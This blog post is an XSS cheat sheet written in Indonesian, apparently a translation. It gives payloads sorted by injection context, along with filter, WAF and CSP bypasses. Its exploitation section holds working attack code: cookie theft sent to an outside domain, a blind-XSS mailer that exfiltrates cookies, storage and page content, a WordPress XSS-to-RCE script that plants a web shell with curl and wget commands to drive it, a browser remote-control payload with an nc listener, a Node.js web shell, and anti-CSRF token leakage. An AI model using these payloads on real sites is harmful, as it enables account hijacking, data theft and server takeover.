---
layout: post
title: xss cheat sheet
---
\# xss-cheat-sheet

\# Basics Xss

> HTML Context - Simple Tag Injection

Gunakan saat input masuk ke dalam nilai atribut dari tag HTML atau tag luar kecuali

yang dijelaskan dalam kasus berikutnya. Tambahkan "->" ke payload jika input masuk dalam komentar HTML.

    <svg onload=alert(1)>
    
    "><svg onload=alert(1)>

> HTML Context - In Block Tag Injection

Gunakan saat input masuk ke dalam atau di antara pembukaan / penutupan tag dalam tanda kurung berikut:

    (<title><style><script><textarea><noscript><pre><xmp>dan<iframe>)(</tag> adalah demikian).
    
    ==========================================================================================
    
    </tag><svg onload=alert(1)>
    
    "></tag><svg onload=alert(1)>

> HTML Context - Inline Injection

Gunakan saat input masuk ke dalam nilai atribut dari tag HTML tetapi tag itu tidak bisa

diakhiri dengan lebih dari tanda (>).

    "onmouseover=alert(1) //
    
    "autofocus onfocus=alert(1) //

> HTML Context - Source Injection

Gunakan ketika input mendarat sebagai nilai dari atribut tag HTML berikut: href, src, data atau

aksi (juga formulasi). Atribut Src dalam tag skrip dapat berupa URL atau "data:, alert (1)".

    javascript:alert(1)

> Javascript Context - Code Injection

Gunakan ketika input mendarat di blok skrip, di dalam nilai string yang dibatasi.

    '-alert(1)-'
    
    '-alert(1)//

> Javascript Context - Code Injection with Escape Bypass

Gunakan ketika input mendarat di blok skrip, di dalam string yang dibatasi nilai tetapi tanda kutip

lolos dengan backslash.

    \\'-alert(1)//

> Javascript Context - Tag Injection

Gunakan saat input mendarat di mana saja dalam blok skrip.

    </script><svg onload=alert(1)>

# Advanced Xss

> Javascript Context - Code Injection in Logical Block

Gunakan muatan pertama atau kedua ketika input masuk dalam blok skrip, di dalam nilai yang dibatasi string dan

di dalam satu blok logis seperti fungsi atau kondisional (if, else, etc). Jika kutipan lolos

backslash, gunakan payload ketiga.

    '}alert(1);{'
    
    '}alert(1)%0A{'
    
    \\'}alert(1);{//

> Javascript Context - Quoteless Code Injection

Gunakan saat ada multi refleksi di baris kode JS yang sama. Muatan 1 bekerja di JS sederhana

variabel dan 2 bekerja di objek JS non-objects

     -alert(1)//\\
    
     -alert(1)}//\\

> Javascript Context - Placeholder Injection in Template Literal

Gunakan saat input masuk ke dalam string backticks (\`\`) yang dibatasi atau di mesin template.

      ${alert(1)}

> Multi Reflection in HTML Context - Double Reflection (Single Input)

Gunakan untuk memanfaatkan banyak refleksi pada halaman yang sama.

    onload=alert(1)><svg/1='
    
    '>alert(1)</script><script/1='
    
    */alert(1)</script><script>/*

> Multi Reflection in HTML Context - Triple Reflection (Single Input)

Gunakan untuk memanfaatkan banyak refleksi pada halaman yang sama.

    */alert(1)">'onload="/*<svg/1='
    
    \`-alert(1)">'onload="\`<svg/1='
    
    */</script>'>alert(1)/*<script/1='

> Multi Input Reflections (Double & Triple) in HTML Context

Gunakan untuk mengambil keuntungan dari beberapa input refleksi pada halaman yang sama. Juga berguna dalam HPP (HTTP

Parameter Pollution) skenario, di mana ada refleksi untuk parameter berulang. Ketiga

payload menggunakan refleksi yang dipisahkan koma dari parameter yang sama.

     p=<svg/1='&q='onload=alert(1)>
    
     p=<svg 1='&q='onload='/*&r=*/alert(1)'>
    
     q=<script/&q=/src=data:&q=alert(1)>

> File Upload Injection – Filename

Gunakan saat nama file yang diunggah reflected di suatu tempat di halaman target.

    "><svg onload=alert(1)>.gif

> File Upload Injection – Metadata

Gunakan ketika metadata file yang diunggah reflected di suatu tempat di halaman target. Itu menggunakan

command-line exiftool ("$" adalah terminal prompt) dan setiap bidang metadata dapat disetel.

    $ exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg

> File Upload Injection – SVG File

Gunakan untuk membuat XSS tersimpan sesuai target saat mengunggah file gambar. Simpan konten di bawah ini sebagai

"Xss.svg".

     <svg xmlns="[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg "http://www.w3.org/2000/svg")" onload="alert(1)"/>

> DOM Insert Injection

Gunakan untuk menguji XSS ketika injeksi dimasukkan ke DOM sebagai markup yang valid alih-alih menjadi

reflected dalam kode sumber. Ini berfungsi untuk kasus di mana tag skrip dan vektor lainnya tidak akan berfungsi.

    <img src=1 onerror=alert(1)>
    
    <iframe src=javascript:alert(1)>
    
    <details open ontoggle=alert(1)>
    
    <svg><svg onload=alert(1)>

> DOM Insert Injection – Resource Request

Gunakan ketika kode javascript halaman memasukkan ke dalam halaman hasil permintaan ke URL

dikontrol oleh penyerang (injeksi).

     data:text/html,<img src=1 onerror=alert(1)>
    
     data:text/html,<iframe src=javascript:alert(1)>

> PHP_SELF Injection

Gunakan ketika URL saat ini digunakan oleh kode PHP yang mendasari target sebagai nilai atribut dari

Bentuk HTML, misalnya. Suntikkan antara ekstensi php dan mulai bagian permintaan (?) Menggunakan a

leading slash (/).

      [https://vulnerabilty-xss.com.br/xss.php/](https://vulnerabilty-xss.com.br/xss.php/ "https://vulnerabilty-xss.com.br/xss.php/")"><svg onload=alert(1)>?a=reader

> Script Injection - No Closing Tag

Gunakan ketika ada tag skrip penutup (</script>) di suatu tempat dalam kode setelah reflection.

      <script src=data:,alert(1)>
    
      <script src=//attacker.com.br/1.js>

> Javascript postMessage() DOM Injection (with Iframe)

Gunakan ketika ada pendengar acara "pesan" seperti di "window.addEventListener (‘ message ’, ...)"

dalam kode javascript tanpa pemeriksaan asal. Target harus dapat dibingkai (X-Frame

Pilihan tajuk sesuai konteks). Simpan sebagai file HTML (atau menggunakan data: teks / html) yang disediakan

TARGET_URL dan INJECTION (vektor XSS atau payload).

      <iframe src=TARGET_URL onload="frames\[0\].postMessage('INJECTION','*')">

> XML-Based XSS

Gunakan untuk menyuntikkan vektor XSS dalam halaman XML (tipe konten teks / xml atau aplikasi / xml).

Tambahkan "->" ke payload jika input masuk di bagian komentar atau "\]\]>" jika input masuk a

Bagian "CDATA".

      <x:script xmlns:x="[http://www.w3.org/1999/xhtml](http://www.w3.org/1999/xhtml "http://www.w3.org/1999/xhtml")">alert(1)</x:script>
    
      <x:script xmlns:x="[http://www.w3.org/1999/xhtml](http://www.w3.org/1999/xhtml "http://www.w3.org/1999/xhtml")" src="//hacker.com.br/1.js"/>

> AngularJS Injections (v1.6 and up)

Gunakan ketika ada perpustakaan AngularJS dimuat di halaman, di dalam blok HTML dengan ng-app

direktif (payload pertama) atau buat milik Anda sendiri (yang kedua).

      {{$new.constructor('alert(1)')()}}
    
      <x ng-app>{{$new.constructor('alert(1)')()}}

> CRLF Injection

Gunakan saat aplikasi merefleksikan input di salah satu header respons, memungkinkan injeksi

Karakter Pengembalian Carriage (% 0D) dan Line Feed (% 0A). Vektor untuk Gecko dan Webkit,

masing-masing.

      %0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C/script%3E
    
      %0D%0ALocation:%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C/script%3E

> Onscroll Universal XSS Vector

Gunakan untuk XSS tanpa interaksi pengguna saat menggunakan pengendali event onscroll. Ini bekerja dengan

alamat, blockquote, body, center, dir, div, dl, dt, form, li, menu, ol, p, pre, ul, dan h1 ke h6

Tag HTML.

     <p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y

> XSS in SSI

Gunakan saat ada injeksi Server-Side Include (SSI).

     <<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->>

> Type Juggling

Gunakan untuk melewati kondisi "if" yang cocok dengan angka dalam perbandingan longgar.

     1<svg onload=alert(1)>
    
     1"><svg onload=alert(1)>

> SQLi Error-Based XSS

Gunakan di titik akhir di mana pesan kesalahan SQL dapat dipicu (dengan kutipan atau backslash).

     '1<svg onload=alert(1)>
    
     <svg onload=alert(1)>\\

> Bootstrap XSS Vector

Gunakan ketika ada perpustakaan bootstrap hadir di halaman. Itu juga memotong Auditor Webkit, adil

klik di mana saja di halaman untuk memicu. Karakter apa pun dari nilai href dapat dikodekan dalam HTML, bypass

filter.

    <html data-toggle=tab href="<img src=x onerror=alert(1)>">

> Browser Notification

Gunakan sebagai alternatif untuk mengingatkan, meminta, dan mengonfirmasi popup. Itu membutuhkan penerimaan pengguna (1 st

payload) tetapi begitu pengguna telah mengotorisasi sebelumnya untuk situs itu, yang ke-2 dapat digunakan.

      Notification.requestPermission(x=>{new(Notification)(1)})
    
      new(Notification)(1)

\# filter bypass

> Mixed Case XSS

Gunakan untuk mem-bypass filter case-sensitive.

      <Svg OnLoad=alert(1)>
    
      <Script>alert(1)</Script>

> Unclosed Tags

Gunakan dalam suntikan HTML untuk menghindari pemfilteran di bawah kedua (<) dan

lebih besar dari (>) tanda. Dibutuhkan asli yang lebih besar dari kode sumber masuk setelah input

refleksi.

     <svg onload=alert(1)//
    
     <svg onload="alert(1)"

> Uppercase XSS

Gunakan saat aplikasi mencerminkan input dalam huruf besar. Ganti "&" dengan "% 26" dan "#" dengan

"% 23" di URL.

      <SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
    
      <SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>

> Extra Content for Script Tags

Gunakan saat filter mencari "<script>" atau "<script src = ..." dengan beberapa variasi tetapi tanpa

memeriksa atribut lain yang tidak diperlukan

     <script/x>alert(1)</script>

> Double Encoded XSS

Gunakan ketika aplikasi melakukan decoding input ganda.

    %253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
    
    %2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E

> Alert without Parentheses (Strings Only)

Gunakan dalam vektor HTML atau injeksi javascript ketika tanda kurung tidak diizinkan dan a

kotak peringatan sederhana sudah cukup.

     alert\`1\`

> Alert without Parentheses

Gunakan dalam vektor HTML atau injeksi javascript ketika tanda kurung tidak diizinkan dan PoC

perlu mengembalikan informasi target.

      setTimeout\`alert\\x28document.domain\\x29\`
    
      setInterval\`alert\\x28document.domain\\x29\`

> Alert without Parentheses (Tag Exclusive)

Gunakan hanya dalam suntikan HTML ketika tanda kurung tidak diizinkan. Ganti “&” dengan “% 26”

dan "#" dengan "% 23" di URL.

      <svg onload=alert&lpar;1&rpar;>
    
      <svg onload=alert&#40;1&#41>

> Alert without Alphabetic Chars

Gunakan saat karakter alfabet tidak diizinkan. Berikut ini adalah peringatan (1).

      \[\]\['\\146\\151\\154\\164\\145\\162'\]\['\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162'\]('\\141\\154\\145\\162\\164\\50\\61\\51')()

> Alert Obfuscation

Gunakan untuk mengelabui beberapa filter ekspresi reguler (regex). Mungkin dikombinasikan dengan sebelumnya

alternatif (above). Opsi terpendek "atas" juga dapat diganti dengan “window”, “parent”,

“self” or “this”  tergantung pada konteksnya.

      (alert)(1)
    
      a=alert,a(1)
    
      \[1\].find(alert)
    
      top\["al"+"ert"\](1)
    
      top\[/al/.source+/ert/.source\](1)
    
      al\\u0065rt(1)
    
      top\['al\\145rt'\](1)
    
      top\[8680439..toString(30)\](1)
    
      top.open\`javas\\cript:al\\ert(1)\`

> Alert Alternative

Gunakan sebagai alternatif untuk mengingatkan, meminta dan mengonfirmasi. Jika digunakan dengan vektor HTML, bisa jadi

digunakan sebagaimana adanya tetapi jika merupakan suntikan JS, formulir "document.write" lengkap diperlukan. Ganti "&"

dengan "% 26" dan "#" dengan "% 23" di URL.

       write\`XSSed!\`
    
       write\`<img/src/o&#78error=alert&lpar;1)&gt;\`

> Strip-Tags Based Bypass

Gunakan saat menyaring menghapus apa pun di antara karakter <dan> seperti strip_tags PHP ()

fungsi. Hanya injeksi inline.

    "o<x>nmouseover=alert<x>(1)//
    
    "autof<x>ocus o<x>nfocus=alert<x>(1)//

> File Upload Injection – HTML/js GIF Disguise

Gunakan untuk mem-bypass CSP melalui pengunggahan file. Simpan semua konten di bawah ini sebagai "xss.gif" atau "xss.js" (untuk ketat

Memeriksa MIME). Itu dapat diimpor ke halaman target dengan <link rel = import href = xss.gif> (juga

“Xss.js”) atau <script src = xss.js> </script>. Ini gambar / gif untuk PHP.

      GIF89a=//<script>
    
      alert(1)//</script>;

> Jump to URL Fragment

Gunakan saat Anda perlu menyembunyikan beberapa karakter dari payload Anda yang akan memicu WAF

sebagai contoh. Itu menggunakan format payload masing-masing setelah fragmen URL (#).

      eval(URL.slice(-8)) #alert(1)
    
      eval(location.hash.slice(1)) #alert(1)
    
      document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>

> HTML Alternative Separators

Gunakan saat ruang default tidak diizinkan. Garis miring dan kutipan (tunggal atau ganda) mungkin URL

disandikan (% 2F,% 27 dan% 22 masing-masing) juga, sementara tanda tambah (+) hanya dapat digunakan dalam URL.

Tag Scheme:

<name \[1\] attrib \[2\] = \[3\] value \[4\] handler \[5\] = \[6\] js \[7\]>

     \[1\], \[2\], \[5\] => %09, %0A, %0C, %0D, %20, / and +
    
     \[3\] & \[4\] => %09, %0A, %0C, %0D, %20, + and ' or " in both
    
     \[6\] & \[7\] => %09, %0A, %0B, %0C, %0D, %20, /, + and ' or " in both

> 2 nd Order XSS Injection

Gunakan saat input Anda akan digunakan dua kali, seperti disimpan dinormalisasi dalam database dan kemudian

diambil untuk digunakan nanti atau dimasukkan ke DOM

      &lt;svg/onload&equals;alert(1)&gt;

> Event Origin Bypass for postMessage() XSS

Use when a check for origin can be bypassed in javascript code of target by prepending one

of the allowed origins as a subdomain of the attacking domain that will send the payload.

Example makes use of Crosspwn script (available in Miscellaneous section) at localhost

     [http://facebook.com.localhost/crosspwn.php?target=//brutelogic.com.br/tests/status.html&msg=](http://facebook.com.localhost/crosspwn.php?target=//brutelogic.com.br/tests/status.html&msg= "http://facebook.com.localhost/crosspwn.php?target=//brutelogic.com.br/tests/status.html&msg=")<script>alert(1)</script>

> CSP Bypass (for Whitelisted Google Domains)

Gunakan ketika ada CSP (Kebijakan Keamanan Konten) yang memungkinkan eksekusi dari ini

domain.

    <script src=[https://www.google.com/complete/search?client=chrome%26jsonp=alert](https://www.google.com/complete/search?client=chrome%26jsonp=alert "https://www.google.com/complete/search?client=chrome%26jsonp=alert")(1);></script>
    
    <script src=[https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js](https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js "https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js")></script><x ng-app ng-csp>{{$new.constructor('alert(1)')()}}

> Vectors without Event Handlers

Gunakan sebagai alternatif untuk penangan acara, jika mereka tidak diizinkan. Beberapa membutuhkan pengguna

interaksi sebagaimana dinyatakan dalam vektor itu sendiri (juga bagian dari mereka).

       <script>alert(1)</script>
    
       <script src=data:,alert(1)>
    
    <iframe src=javascript:alert(1)>
    
    <embed src=javascript:alert(1)>
    
    <a href=javascript:alert(1)>click
    
    <math><brute href=javascript:alert(1)>click
    
    <form action=javascript:alert(1)><input type=submit>
    
    <isindex action=javascript:alert(1) type=submit value=click>
    
    <form><button formaction=javascript:alert(1)>click
    
    <form><input formaction=javascript:alert(1) type=submit value=click>
    
    <form><input formaction=javascript:alert(1) type=image value=click>
    
    <form><input formaction=javascript:alert(1) type=image src=SOURCE>
    
    <isindex formaction=javascript:alert(1) type=submit value=click>
    
    <object data=javascript:alert(1)>
    
    <iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
    
    <svg><script xlink:href=data:,alert(1) />
    
    <math><brute xlink:href=javascript:alert(1)>click

> Vectors with Agnostic Event Handlers

Gunakan vektor berikut ini ketika semua nama tag HTML yang dikenal tidak diizinkan. Huruf apa saja

char atau string dapat digunakan sebagai nama tag di tempat "x". Mereka membutuhkan interaksi pengguna seperti yang dinyatakan

oleh konten teks mereka sendiri (yang menjadi bagian dari vektor juga).

     <x contenteditable onblur=alert(1)>lose focus!
    
     <x onclick=alert(1)>click this!
    
    <x oncopy=alert(1)>copy this!
    
    <x oncontextmenu=alert(1)>right click this!
    
    <x onauxclick=alert(1)>right click this!
    
    <x oncut=alert(1)>copy this!
    
    <x ondblclick=alert(1)>double click this!
    
    <x ondrag=alert(1)>drag this!
    
    <x contenteditable onfocus=alert(1)>focus this!
    
    <x contenteditable oninput=alert(1)>input here!
    
    <x contenteditable onkeydown=alert(1)>press any key!
    
    <x contenteditable onkeypress=alert(1)>press any key!
    
    <x contenteditable onkeyup=alert(1)>press any key!
    
    <x onmousedown=alert(1)>click this!
    
    <x onmousemove=alert(1)>hover this!
    
    <x onmouseout=alert(1)>hover this!
    
    <x onmouseover=alert(1)>hover this!
    
    <x onmouseup=alert(1)>click this!
    
    <x contenteditable onpaste=alert(1)>paste here! 

> Javascript Alternative Comments

Gunakan ketika komentar javascript biasa (garis miring ganda) tidak diizinkan, diloloskan atau

dihapus.

     <!--%0A-->

> SVG Script Vector - Arbitrary Closing TagGunakan saat filter mengharapkan "</script>" dan tidak ada penutupan asli setelah injeksi masuk

kode sumber dan / atau tanda sama dengan tidak diizinkan. Hanya tokek.

    <svg><x><script>alert(1)</x>

> Mixed Context Reflection Entity Bypass

Gunakan untuk mengubah refleksi yang difilter dalam blok skrip dalam kode js yang sebenarnya valid. Itu perlu direfleksikan

baik dalam konteks HTML dan javascript, dalam urutan itu, dan dekat satu sama lain. Tag svg

akan membuat blok skrip berikutnya diurai dengan cara yang bahkan jika tanda kutip tunggal menjadi

disandikan sebagai & # 39; dalam refleksi (disanitasi), itu akan berlaku untuk keluar dari nilai saat ini

dan memicu peringatan.

     '-alert(1)-'<svg>
    
     \\'-alert(1)//<svg>

> Strip-My-Script Vector

Gunakan untuk mengelabui filter yang menghapus vektor XSS klasik dan paling dikenal. Ini berfungsi apa adanya dan jika

"<script>" dihapus.

       <svg/on<script><script>load=alert(1)//</script>

> JS Lowercased Input

Gunakan ketika aplikasi target mengubah input Anda menjadi huruf kecil melalui javascript. Mungkin berhasil

juga untuk operasi huruf kecil sisi server.

     <SCRİPT>alert(1)</SCRİPT>
    
     <SCRİPT/SRC=data:,alert(1)> 

> Overlong UTF-8

Gunakan saat aplikasi target melakukan pemetaan yang paling sesuai.

    %CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>

> Uncommon Event Handlers

Gunakan untuk memintas filter berbasis daftar hitam untuk penangan acara. Ini berfungsi pada Tokek tetapi menambahkan

attributename = x di dalam tag "<set>" membuatnya berfungsi di Webkit juga

       <svg><set onbegin=alert(1)>
    
       <svg><set end=1 onend=alert(1)>

> HTML Entities - Null Byte Tolerance

Gunakan untuk menghindari penyaringan entitas HTML. Semua di atas hanya mewakili karakter "(". Tokek.

      %26%00%2340;
    
      %26%00lpar;
    
      %26%00l%26%00p%26%00a%26%00r%26%00;

> Vectors Exclusive for ASP Pages

Gunakan untuk memintas filter \[\[alpha\] di halaman .asp.

       %u003Csvg onload=alert(1)>
    
       %u3008svg onload=alert(2)>
    
       %uFF1Csvg onload=alert(3)>

> PHP Email Validation Bypass

Gunakan untuk memintas flag FILTER_VALIDATE_EMAIL flag dari fungsi filter_var () PHP.

       "><svg/onload=alert(1)>"@x.y

> DOM Insertion via Server Side Reflection

Gunakan ketika input direfleksikan ke sumber dan tidak bisa dijalankan dengan mencerminkan tetapi dengan menjadi

dimasukkan ke dalam DOM. Menghindari pemfilteran browser dan WAFs.

       \\74svg o\\156load\\75alert\\501\\51\\76

> XML-Based Vector for Bypass

Gunakan untuk memintas penyaringan browser dan WAFs di halaman XML. Tambahkan "->" ke payload jika input

mendarat di bagian komentar atau "\]\]>" jika input mendarat di bagian "CDATA".

       <_:script xmlns:_="[http://www.w3.org/1999/xhtml](http://www.w3.org/1999/xhtml "http://www.w3.org/1999/xhtml")">alert(1)</_:script>

> Javascript Context - Tag Injection (Webkit Bypass)

Gunakan untuk memotong Auditor Webkit dalam konteks javascript dengan keluar dari blok skrip.

       </script><svg><script>alert(1)//
    
       </script><script>'%0B'-alert(1)//

> Double Reflection With Single Input (Webkit Bypass)

Gunakan untuk memintas Auditor Webkit dalam skenario refleksi ganda untuk konteks apa pun.

       "\`-alert(1)</script><script>\`

> Vector for PHP Arrays Dump (Webkit Bypass)

Gunakan ketika refleksi berasal dari penggunaan fungsi PHP var_dump () dan print_r (). "P" adalah

parameter rentan.

       ?p\[<script>\`\]=\`/alert(1)</script>

> Javascript Context - Code Injection (IE11/Edge Bypass)

Gunakan untuk mem-bypass Microsoft IE11 atau Edge saat menyuntikkan ke dalam konteks javascript.

       ';onerror=alert;throw 1//

> HTML Context - Tag Injection (IE11/Edge XSS Bypass)

Gunakan untuk mem-bypass filter asli mereka dalam skenario multi-refleksi.

       "'>confirm&lpar;1)</Script><Svg><Script/1='

> DOM-Based XSS - Location Sink Filter Evasion

Gunakan saat filter mencari "https: // DOMAIN" dalam string yang digunakan untuk pengalihan

properti document.location. Itu juga menyalahgunakan cara string "Javascript" dapat dibangun.

       %01Jav%09asc%09ript:https://DOMAIN/%250Acon%09firm%25%281%25%29

> Vectors with Less Known Agnostic Event Handlers

Penangan acara yang dapat digunakan dengan nama tag yang berubah-ubah. Namun perlu diingat bahwa menggunakan

nama tag yang ada seperti "<b" untuk onafterscriptexecute dan onbeforescriptexecute mungkin

satu-satunya cara untuk memicu dalam beberapa skenario.

       <x onmouseenter=alert(1)>
    
       <x onafterscriptexecute=alert(1)>
    
       <x onbeforescriptexecute=alert(1)>
    
       <x onanimationend=alert(1)><style>x{animation:s}@keyframes s{}
    
       <x onwebkitanimationend=alert(1)><style>x{animation:s}@keyframes s{}

> Nested SVG Vector (Base64)

Gunakan untuk memintas filter. Hanya tokek, URL disandikan.

       <svg><use xlink:href=data:image/svg%2Bxml;base64,
    
       PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnL
    
       zIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My
    
       5vcmcvMTk5OS94bGluayI%2BPGVtYmVkIHhtbG5zPSJodHRwO
    
       i8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3
    
       JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>

\#  exploitation

> Remote Script Call

Gunakan ketika Anda perlu memanggil skrip eksternal tetapi vektor XSS adalah berbasis handler (seperti

<svg onload =) atau dalam suntikan javascript. Domain "brutelogic.com.br" bersama dengan HTML

dan file js digunakan sebagai contoh. Jika ">" sedang difilter, ganti "r =>" atau "w =>" untuk

"fungsi()".

=> Berbasis HTML

(respons harus berupa HTML dengan tajuk Akses-Kontrol-Bolehkan-Asal (CORS))

       1. "var x=new XMLHttpRequest();x.open('GET','//brutelogic.com.br/0.php');x.send();
    
          x.onreadystatechange=function(){if(this.readyState==4){write(x.responseText)}}"
    
       2. fetch('//brutelogic.com.br/0.php').then(r=>{r.text().then(w=>{write(w)})})
    
          * (with fully loaded JQuery library)
    
       3. $.get('//brutelogic.com.br/0.php',r=>{write(r)})
    
          => Javascript-based (response must be javascript)
    
       4. with(document)body.appendChild(createElement('script')).src='//brutelogic.com.br/2.js'
    
          * (with fully loaded JQuery library)
    
       5. $.getScript('//brutelogic.com.br/2.js')

> Wordpress XSS to RCE (v5.0.3)

Gunakan itu sebagai skrip jarak jauh untuk dijalankan ketika admin Wordpress mendapat XSSed untuk membuat shell web.

Plugin "Hello Dolly" adalah target di sini (terlepas dari aktivasi) tetapi hampir semua plugin lainnya

dapat digunakan, mengubah file dan jalur yang sesuai (termasuk "wordpress" sebagai WP root).

       p = '/wp-admin/plugin-editor.php?';
    
       q = 'file=hello.php&plugin=hello.php';
    
       s = '<?=\`$_POST\[1\]\`;';
    
       a = new XMLHttpRequest();
    
       a.open('GET', p+q, 0);
    
       a.send();
    
       $ = 'nonce=' + /nonce" value="(\[^"\]*?)"/.exec(a.responseText)\[1\] +
    
       '&newcontent=' + s + '&action=edit-theme-plugin-file&' + q;
    
       b = new XMLHttpRequest();
    
       b.open('POST', p, 1);
    
       b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    
       b.send($);
    
       b.onreadystatechange = function(){
    
       if (this.readyState == 4) fetch('/wp-content/plugins/hello.php');
    
       }

=> Jalankan perintah shell web di terminal seperti berikut ("id" sebagai contoh):

       $ curl DOMAIN/wp-content/plugins/hello.php -d 1=id
    
       $ wget -qO- DOMAIN/wp-content/plugins/hello.php --post-data 1=id

> Blind XSS Mailer

Gunakan sebagai skrip remote XSS blind yang menyimpan file PHP dan ubah $ menjadi dan $ header header

demikian. Diperlukan server surat yang berfungsi seperti Postfix.

       <?php header("Content-type: application/javascript"); ?>
    
       var mailer = '<?= "//" . $_SERVER\["SERVER_NAME"\] . $_SERVER\["REQUEST_URI"\] ?>';
    
       var msg = 'USER AGENT\\n' + navigator.userAgent + '\\n\\nTARGET URL\\n' + document.URL;
    
       msg += '\\n\\nREFERRER URL\\n' + document.referrer + '\\n\\nREADABLE COOKIES\\n' +
    
       document.cookie;
    
       msg += '\\n\\nSESSION STORAGE\\n' + JSON.stringify(sessionStorage) + '\\n\\nLOCAL
    
       STORAGE\\n' + JSON.stringify(localStorage);
    
       msg += '\\n\\nFULL DOCUMENT\\n' + document.documentElement.innerHTML;
    
       var r = new XMLHttpRequest();
    
       r.open('POST', mailer, true);
    
       r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    
       r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));
    
    
    
       <?php
    
       header("Access-Control-Allow-Origin: " . $_POST\["origin"\]);
    
       $origin = $_POST\["origin"\];
    
       $to = "myName@myDomain";
    
       $subject = "XSS Blind Report for " . $origin;
    
       $ip = "Requester: " . $_SERVER\["REMOTE_ADDR"\] . "\\nForwarded For: ".
    
       $_SERVER\["HTTP_X_FORWARDED_FOR"\];
    
       $msg = $subject . "\\n\\nIP ADDRESS\\n" . $ip . "\\n\\n" . $_POST\["msg"\];
    
       $headers = "From: report@myDomain" . "\\r\\n";
    
       if ($origin && $msg) mail($to, $subject, $msg, $headers);
    
       ?>

> Invisible Foreign XSS Embedding

Gunakan untuk memuat XSS dari domain lain (atau subdomain) ke domain saat ini. Dibatasi oleh

header X-Frame-Options (XFO) target. Contoh peringatan di bawah ini dalam konteks brutelogic.com.br

terlepas dari domain.

       <iframe src="//brutelogic.com.br/xss.php?a=<svg onload=alert(document.domain)>"
    
       style=display:none></iframe>

> Cookie Stealing

Gunakan untuk mendapatkan semua cookie dari pengguna korban yang ditetapkan oleh situs target. Cookie tidak dapat dilindungi oleh

http Hanya bendera keamanan. Encode "+" sebagai "% 2B" di URL.

       fetch('//brutelogic.com.br/?c='+document.cookie)

> Simple Virtual Defacement

Gunakan untuk mengubah bagaimana situs akan muncul ke korban menyediakan kode HTML. Dalam contoh di bawah ini a

Pesan "Tidak Ditemukan" ditampilkan.

       documentElement.innerHTML='<h1>Not Found</h1>'

> Browser Remote Control

Gunakan untuk menghubungkan browser dan mengirim perintah javascript ke dalamnya secara interaktif. Gunakan javascript

kode di bawah ini bukannya peringatan (1) dalam injeksi Anda dengan terminal seperti Unix yang terbuka dengan

mengikuti skrip shell (pendengar). Berikan HOST sebagai nama host, alamat IP, atau domain ke

menerima perintah dari mesin penyerang.

       => Javascript (payload):
    
       setInterval(function(){with(document)body.
    
       appendChild(createElement('script')).src='//HOST:5855'},100)

=> Listener (terminal command):

       $ while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done 

> Node.js Web Shell

Gunakan untuk membuat shell web di aplikasi Node.js yang rentan. Setelah menjalankan payload di bawah ini

gunakan shell dengan cara berikut: http: // target: 5855 /? cmd = my_node.js_command

Contoh untuk pop calc: cmd = membutuhkan ('child_process'). Exec ('gnome-calculator').

       require('http').createServer(function(req,res){res.end(1-
    
       eval(require('url').parse(req.url,1).query.cmd))}).listen(5855)

> HTMLi Token Leak

Gunakan ketika XSS tidak memungkinkan tetapi beberapa injeksi HTML mungkin terjadi. Itu akan memeras apa pun

token anti-CSRF (atau nilai rahasia lainnya) yang mungkin ada di antara berbasis sumber

refleksi dan kutipan tunggal berikutnya dalam kode asli. Berikan HOST dengan skrip untuk meraih

parameter token atau periksa log server. Terlepas dari contoh di bawah ini, <img atau <tag gambar dengan

src = 'atau srcset =' juga melakukan pekerjaan itu.

       <x style='content:url(//HOST/?token=
    
       <x style='background:url(//HOST/?token=
    
       <x style='background-image:url(//HOST/?token=

\# miscellaneous

> XSS Online Test Page

Gunakan untuk berlatih vektor dan muatan XSS. Periksa kode sumber untuk titik injeksi.

      [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php "https://brutelogic.com.br/xss.php")

> Multi-Case HTML Injection

Gunakan sebagai satu-shot untuk mendapatkan tingkat XSS sukses yang lebih tinggi. Ini berfungsi dalam semua kasus HTML

konteks (lihat bagian Dasar-dasar), termasuk JS dengan injeksi tag. Perhatikan spasi sebagai

failover untuk sanitasi / pelarian sederhana yang dilakukan oleh aplikasi.

       </Script/"'--><Body /Autofocus /OnFocus = confirm\`1\` <!-->

> Multi-Case HTML Injection - Base64

> Gunakan sebagai satu-shot untuk mendapatkan tingkat XSS sukses lebih tinggi di bidang input Base64. Itu bekerja di semua kasus konteks HTML (lihat bagian Dasar), termasuk JS yang berisi injeksi tag

       PC9TY3JpcHQvIictLT48Qm9keSAvQXV0b2ZvY3VzIC9PbkZvY3VzID0gY29uZmlybWAxYCA8IS0tPg==

> JavaScript Libraries Scraper

Gunakan untuk mendapatkan semua tautan absolut dan relatif ke perpustakaan yang ditemukan dalam kode sumber

DOMAIN / HALAMAN. Ini perintah satu baris dan "$" adalah terminal prompt.

       $ wget -nd -rH -A js --spider DOMAIN/PAGE 2>&1 | awk '/^--.*\\.js?/{print $3}'

> PHP Sanitizing for XSS

